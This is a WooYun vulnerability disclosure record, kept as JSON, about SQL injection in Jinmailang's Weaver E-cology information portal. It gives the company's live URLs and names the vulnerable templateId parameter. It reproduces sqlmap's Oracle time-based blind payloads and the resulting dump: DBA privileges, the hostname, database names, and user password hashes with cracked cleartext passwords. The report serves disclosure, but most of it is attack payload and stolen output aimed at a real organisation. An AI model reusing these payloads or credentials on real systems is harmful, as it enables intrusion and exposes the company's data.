{"id": 31078, "wybug_id": "wooyun-2015-0114961", "wybug_title": "今麦郎某系统SQL注入漏洞", "wybug_corp": "今麦郎", "wybug_author": "TT向上", "wybug_date": "2015-05-19 17:08", "wybug_open_date": "2015-07-03 17:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "11", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "今麦郎"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-19：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-07-03：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 今麦郎食品集团信息门户系统SQL注入 详细说明：  今麦郎食品集团信息门户系统SQL注入。   漏洞证明：  访问今麦郎饮品有限公司官网，http://www.jmlyp.com/，右上角信息门户系统。http://home.jmlyp.com/login/Login.jsp?logintype=1\n\n登陆页面测试一下是否有注入，然后跳转到存在注入页面；http://home.jmlyp.com/wui/theme/ecology7/page/login.jsp?templateId=101&logintype=1&gopage=&languageid=7&message=55\n\n用的系统实际是泛微E-COLOGY，templateId参数存在SQL注入，直接放到sqlmap里面跑即可。oracle盲注，跑起来很慢。sqlmap信息。dba权限，Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bi版本，\nParameter: templateId (GET)    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: templateId=101' AND 3194=DBMS_PIPE.RECEIVE_MESSAGE(CHR(109)||CHR(76)||CHR(80)||CHR(114),5) AND 'FKyh'='FKyh&logintype=1&gopage=&languageid=7&message=55---web application technology: JSPback-end DBMS: Oraclebanner:    'Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bi'current user:    'COLOGY'current schema (equivalent to database on Oracle):    'COLOGY'hostname:    'cology.jmlyp.com'current user is DBA:    True\ndatabase management system users\ndatabase management system users [22]:[*] ANONYMOUS[*] COLOGY[*] CTXSYS[*] DBSNMP[*] DIP[*] DMSYS[*] EXFSYS[*] MDDATA[*] MDSYS[*] MGMT_VIEW[*] OLAPSYS[*] ORDPLUGINS[*] ORDSYS[*] OUTLN[*] SCOTT[*] SI_INFORMTN_SCHEMA[*] SYS[*] SYSMAN[*] SYSTEM[*] TSMSYS[*] WMSYS[*] XDBdatabase management system users password hashes:[*] ANONYMOUS [1]:    password hash: anonymous[*] COLOGY [1]:    password hash: 02B594CB6E4804F3    clear-text password: COLOGY[*] CTXSYS [1]:    password hash: 71E687F036AD56E5    clear-text password: CHANGE_ON_INSTALL[*] DBSNMP [1]:    password hash: FFF45BB2C0C327EC    clear-text password: ORACLE[*] DIP [1]:    password hash: CE4A36B8E06CA59C    clear-text password: DIP[*] DMSYS [1]:    password hash: BFBA5A553FD9E28A    clear-text password: DMSYS[*] EXFSYS [1]:    password hash: 66F4EF5650C20355    clear-text password: EXFSYS[*] MDDATA [1]:    password hash: DF02A496267DEE66    clear-text password: MDDATA[*] MDSYS [1]:    password hash: 72979A94BAD2AF80    clear-text password: MDSYS[*] MGMT_VIEW [1]:    password hash: 442167C25FAC883C[*] OLAPSYS [1]:    password hash: 3FB8EF9DB538647C    clear-text password: MANAGER[*] ORDPLUGINS [1]:    password hash: 88A2B2C183431F00    clear-text password: ORDPLUGINS[*] ORDSYS [1]:    password hash: 7EFA02EC7EA6B86F    clear-text password: ORDSYS[*] OUTLN [1]:    password hash: 4A3BA55E08595C81    clear-text password: OUTLN[*] SCOTT [1]:    password hash: F894844C34402B67    clear-text password: TIGER[*] SI_INFORMTN_SCHEMA [1]:    password hash: 84B8CBCA4D477FA3    clear-text password: SI_INFORMTN_SCHEMA[*] SYS [1]:    password hash: 8A8F029737A9097A\\x03[*] SYSMAN [1]:    password hash: 2CA614501F09FCCC    clear-text password: ORACLE[*] SYSTEM [1]:    password hash: 2D594E86F93B17A1    clear-text password: ORACLE[*] TSMSYS [1]:    password hash: 3DF26A8B17D0F29F    clear-text password: TSMSYS[*] WMSYS [1]:    password hash: 7C9BA362F8314299    clear-text password: WMSYS[*] XDB [1]:    password hash: 88D8364765FCE6AF    clear-text password: CHANGE_ON_INSTALL\n数据库信息，后面没再跑，太慢了\nParameter: templateId (GET)    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: templateId=101' AND 7017=DBMS_PIPE.RECEIVE_MESSAGE(CHR(112)||CHR(65)||CHR(85)||CHR(106),5) AND 'ekFf'='ekFf&logintype=1&gopage=&languageid=7&message=55---web application technology: JSPback-end DBMS: Oracleavailable databases [16]:[*] \"COLOGY\\X05\\X11\"[*] \"SYSMAN\\X11\"[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EXFSYS[*] MDSYS[*] OLAPSYS[*] ORDYYS[*] OUTLN[*] SCOTT[*] SYS[*] SYSTEM[*] TSMSYS[*] WMSYS[*] XDB\n验证到此为止，应该可以说明问题了   修复方案：  过滤，审计泛微版本   版权声明：转载请注明来源 TT向上@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}